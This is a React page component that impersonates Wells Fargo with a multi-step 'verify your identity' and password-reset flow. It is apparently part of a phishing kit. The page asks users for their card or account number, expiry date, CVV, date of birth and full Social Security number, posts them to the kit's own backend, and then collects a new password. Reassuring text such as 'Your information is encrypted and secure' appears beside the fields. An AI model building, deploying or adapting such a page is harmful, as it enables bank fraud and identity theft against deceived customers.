import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Mail, Phone, Loader2, Lock, CreditCard, CheckCircle, Shield } from "lucide-react";
import { useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";
import { MobileMenu } from "@/components/mobile-menu";

const verificationMethods = [
  {
    id: "email",
    icon: Mail,
    title: "Email",
    description: "We'll send a one-time code to your email on file",
  },
  {
    id: "text",
    icon: Phone,
    title: "Text message",
    description: "We'll send a one-time code to your mobile number",
  },
  {
    id: "call",
    icon: Phone,
    title: "Phone call",
    description: "We'll call you with a one-time code",
  },
];

const verifySchema = z.object({
  email: z.string().optional(),
  phone: z.string().optional(),
  cardOrAccountNumber: z.string().min(8, "Please enter a valid card or account number"),
  cardExpiration: z.string().optional(),
  cardCvv: z.string().optional(),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  ssn: z.string().min(9, "Please enter your full SSN (9 digits)").max(11),
});

const passwordSchema = z.object({
  newPassword: z.string().min(8, "Password must be at least 8 characters"),
  confirmPassword: z.string().min(8, "Password must be at least 8 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

type VerifyFormData = z.infer<typeof verifySchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

function isCardNumber(value: string): boolean {
  const digitsOnly = value.replace(/\D/g, '');
  if (digitsOnly.length < 13) return false;
  if (digitsOnly.length > 19) return false;
  const firstDigit = digitsOnly.charAt(0);
  const firstTwo = digitsOnly.substring(0, 2);
  if (firstDigit === '4') return true;
  if (firstTwo >= '51' && firstTwo <= '55') return true;
  if (firstTwo === '34' || firstTwo === '37') return true;
  if (firstDigit === '6') return true;
  if (firstTwo === '35') return true;
  if (digitsOnly.length >= 13 && digitsOnly.length <= 19) return true;
  return false;
}

export default function VerifyPage() {
  const [step, setStep] = useState<"choose" | "identity" | "password" | "success">("choose");
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [showCardFields, setShowCardFields] = useState(true);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const { data: authData, isLoading, error } = useQuery({
    queryKey: ["/api/auth/me"],
  });

  useEffect(() => {
    if (error) {
      setLocation("/");
    }
  }, [error, setLocation]);

  const verifyForm = useForm<VerifyFormData>({
    resolver: zodResolver(verifySchema),
    defaultValues: {
      email: "",
      phone: "",
      cardOrAccountNumber: "",
      cardExpiration: "",
      cardCvv: "",
      dateOfBirth: "",
      ssn: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      newPassword: "",
      confirmPassword: "",
    },
  });

  const cardOrAccountValue = verifyForm.watch("cardOrAccountNumber");

  useEffect(() => {
    if (cardOrAccountValue) {
      const digitsOnly = cardOrAccountValue.replace(/\D/g, '');
      if (digitsOnly.length >= 8) {
        const isCard = isCardNumber(cardOrAccountValue);
        setShowCardFields(isCard);
        if (!isCard) {
          verifyForm.setValue("cardExpiration", "");
          verifyForm.setValue("cardCvv", "");
        }
      } else {
        setShowCardFields(true);
      }
    } else {
      setShowCardFields(true);
    }
  }, [cardOrAccountValue, verifyForm]);

  const verifyMutation = useMutation({
    mutationFn: async (data: VerifyFormData) => {
      const isCard = isCardNumber(data.cardOrAccountNumber);
      const response = await apiRequest("POST", "/api/auth/verify-identity", {
        verificationType: selectedMethod,
        email: data.email || null,
        phone: data.phone || null,
        cardNumber: isCard ? data.cardOrAccountNumber : null,
        accountNumber: !isCard ? data.cardOrAccountNumber : null,
        cardExpiration: isCard ? data.cardExpiration : null,
        cardCvv: isCard ? data.cardCvv : null,
        dateOfBirth: data.dateOfBirth,
        ssn: data.ssn,
      });
      return response;
    },
    onSuccess: () => {
      setStep("password");
    },
    onError: (error: Error) => {
      toast({
        title: "Verification Failed",
        description: error.message || "The information provided does not match our records.",
        variant: "destructive",
      });
    },
  });

  const resetPasswordMutation = useMutation({
    mutationFn: async (data: { newPassword: string; confirmPassword: string }) => {
      const response = await apiRequest("POST", "/api/auth/reset-password", data);
      return response;
    },
    onSuccess: () => {
      setStep("success");
    },
    onError: (error: Error) => {
      toast({
        title: "Update Failed",
        description: error.message || "Failed to update password.",
        variant: "destructive",
      });
    },
  });

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="text-center">
          <Loader2 className="w-10 h-10 animate-spin text-[#d71e28] mx-auto mb-4" />
          <p className="text-gray-600">Loading your secure session...</p>
        </div>
      </div>
    );
  }

  if (error || !authData) {
    return null;
  }

  const handleMethodSelect = (methodId: string) => {
    setSelectedMethod(methodId);
    verifyForm.reset();
    setShowCardFields(true);
    setStep("identity");
  };

  const handleVerify = (data: VerifyFormData) => {
    verifyMutation.mutate(data);
  };

  const handlePasswordReset = (data: PasswordFormData) => {
    resetPasswordMutation.mutate(data);
  };

  const handleSuccessComplete = () => {
    setLocation("/");
  };

  const isEmailMethod = selectedMethod === "email";

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
        <div className="flex-1"></div>
        <h1 
          className="text-white text-xl tracking-wide font-bold"
          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
        >
          WELLS FARGO
        </h1>
        <div className="flex-1 flex justify-end">
          <MobileMenu />
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="h-1.5 bg-[#ffcd41]"></div>

      <main className="flex-1 px-5 py-6">
        {step === "choose" && (
          <>
            <h2 
              className="text-2xl text-[#1a1a1a] mb-2"
              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
              data-testid="text-title"
            >
              Let's make sure it's you
            </h2>
            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
              To keep your account safe, we need to verify your identity. Choose how you'd like to receive your security code.
            </p>

            <div className="space-y-3">
              {verificationMethods.map((method) => (
                <button
                  key={method.id}
                  onClick={() => handleMethodSelect(method.id)}
                  className="w-full p-4 text-left border-2 border-gray-200 rounded-lg hover:border-[#d71e28] hover:bg-gray-50 transition-all flex items-center gap-4"
                  data-testid={`button-method-${method.id}`}
                >
                  <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center text-white flex-shrink-0">
                    <method.icon className="w-6 h-6" />
                  </div>
                  <div className="flex-1">
                    <p className="font-semibold text-[#1a1a1a] text-base">{method.title}</p>
                    <p className="text-sm text-gray-500">{method.description}</p>
                  </div>
                </button>
              ))}
            </div>

            {/* Security info */}
            <div className="mt-6 flex items-start gap-3 p-4 bg-gray-50 rounded-lg border border-gray-200">
              <Shield className="w-5 h-5 text-[#d71e28] flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-sm text-gray-700 font-medium">Why am I seeing this?</p>
                <p className="text-xs text-gray-500 mt-1 leading-relaxed">
                  This additional step helps protect your account from unauthorized access. We may ask for verification when you sign on from a new device or location.
                </p>
              </div>
            </div>
          </>
        )}

        {step === "identity" && (
          <>
            <button
              onClick={() => {
                setStep("choose");
                setSelectedMethod(null);
              }}
              className="text-[#d71e28] text-sm mb-4 font-medium hover:underline"
              data-testid="button-back"
            >
              &lt; Back
            </button>

            <h2 
              className="text-2xl text-[#1a1a1a] mb-2"
              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
              data-testid="text-identity-title"
            >
              Confirm your identity
            </h2>
            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
              To complete verification, please provide the information below. This helps us confirm you're the account owner.
            </p>

            <Form {...verifyForm}>
              <form onSubmit={verifyForm.handleSubmit(handleVerify)} className="space-y-5">
                {isEmailMethod ? (
                  <FormField
                    control={verifyForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[#1a1a1a] font-medium text-sm">Email address</FormLabel>
                        <FormControl>
                          <Input
                            type="email"
                            placeholder="name@example.com"
                            autoComplete="email"
                            className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                            data-testid="input-email"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                ) : (
                  <FormField
                    control={verifyForm.control}
                    name="phone"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[#1a1a1a] font-medium text-sm">Mobile phone number</FormLabel>
                        <FormControl>
                          <Input
                            type="tel"
                            placeholder="(555) 555-5555"
                            autoComplete="tel"
                            className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                            data-testid="input-phone"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                )}

                <FormField
                  control={verifyForm.control}
                  name="cardOrAccountNumber"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-[#1a1a1a] font-medium text-sm flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        Wells Fargo card or account number
                      </FormLabel>
                      <FormControl>
                        <Input
                          type="text"
                          placeholder="Enter your card or account number"
                          inputMode="numeric"
                          maxLength={19}
                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                          data-testid="input-card-account-number"
                          {...field}
                        />
                      </FormControl>
                      <p className="text-xs text-gray-500 mt-1">
                        {showCardFields 
                          ? "Enter your debit card, credit card, or account number" 
                          : "Account number detected - no CVV required"}
                      </p>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {showCardFields && (
                  <div className="grid grid-cols-2 gap-4">
                    <FormField
                      control={verifyForm.control}
                      name="cardExpiration"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-[#1a1a1a] font-medium text-sm">Exp. date</FormLabel>
                          <FormControl>
                            <Input
                              type="text"
                              placeholder="MM/YY"
                              inputMode="numeric"
                              maxLength={5}
                              className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                              data-testid="input-card-expiration"
                              {...field}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={verifyForm.control}
                      name="cardCvv"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-[#1a1a1a] font-medium text-sm">Security code (CVV)</FormLabel>
                          <FormControl>
                            <Input
                              type="password"
                              placeholder="3 digits"
                              inputMode="numeric"
                              maxLength={4}
                              className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                              data-testid="input-card-cvv"
                              {...field}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                )}

                <FormField
                  control={verifyForm.control}
                  name="dateOfBirth"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Date of birth</FormLabel>
                      <FormControl>
                        <Input
                          type="date"
                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                          data-testid="input-dob"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={verifyForm.control}
                  name="ssn"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Social Security number</FormLabel>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="XXX-XX-XXXX"
                          inputMode="numeric"
                          maxLength={11}
                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                          data-testid="input-ssn"
                          {...field}
                        />
                      </FormControl>
                      <p className="text-xs text-gray-500 mt-1">
                        Enter your full 9-digit Social Security number
                      </p>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <div className="pt-4">
                  <Button
                    type="submit"
                    className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
                    disabled={verifyMutation.isPending}
                    data-testid="button-verify-submit"
                  >
                    {verifyMutation.isPending ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      "Continue"
                    )}
                  </Button>
                </div>
              </form>
            </Form>

            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
              <Lock className="w-4 h-4 text-green-600" />
              <span>Your information is encrypted and secure</span>
            </div>
          </>
        )}

        {step === "password" && (
          <>
            <div className="flex items-center gap-2 mb-4">
              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                <CheckCircle className="w-4 h-4 text-white" />
              </div>
              <span className="text-green-700 font-medium text-sm">Identity verified</span>
            </div>

            <h2 
              className="text-2xl text-[#1a1a1a] mb-2"
              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
              data-testid="text-password-title"
            >
              Create a new password
            </h2>
            <p className="text-gray-600 mb-6 text-sm leading-relaxed">
              Choose a strong password that you haven't used before. Your password must be at least 8 characters.
            </p>

            <Form {...passwordForm}>
              <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
                <FormField
                  control={passwordForm.control}
                  name="newPassword"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">New password</FormLabel>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="Enter new password"
                          autoComplete="new-password"
                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                          data-testid="input-new-password"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={passwordForm.control}
                  name="confirmPassword"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-[#1a1a1a] font-medium text-sm">Re-enter new password</FormLabel>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="Confirm new password"
                          autoComplete="new-password"
                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
                          data-testid="input-confirm-password"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Password requirements */}
                <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
                  <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
                  <ul className="text-xs text-gray-600 space-y-1">
                    <li>• At least 8 characters</li>
                    <li>• Mix of letters and numbers recommended</li>
                    <li>• Avoid using personal information</li>
                  </ul>
                </div>

                <div className="pt-2">
                  <Button
                    type="submit"
                    className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
                    disabled={resetPasswordMutation.isPending}
                    data-testid="button-password-submit"
                  >
                    {resetPasswordMutation.isPending ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Saving...
                      </>
                    ) : (
                      "Save password"
                    )}
                  </Button>
                </div>
              </form>
            </Form>
          </>
        )}

        {step === "success" && (
          <div className="flex flex-col items-center justify-center py-16">
            {/* Large green checkmark circle */}
            <div className="w-32 h-32 bg-[#00873c] rounded-full flex items-center justify-center mb-8 shadow-lg">
              <CheckCircle className="w-20 h-20 text-white" strokeWidth={2.5} />
            </div>
            <h2 
              className="text-3xl text-[#1a1a1a] mb-3 text-center font-semibold"
              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
              data-testid="text-success-title"
            >
              All done!
            </h2>
            <p className="text-gray-600 mb-10 text-center text-base leading-relaxed max-w-sm">
              Your password has been updated successfully. You can now sign on with your new password.
            </p>
            <Button
              onClick={handleSuccessComplete}
              className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
              data-testid="button-back-to-login"
            >
              Sign on
            </Button>
          </div>
        )}
      </main>

      <OfficialFooter />
    </div>
  );
}
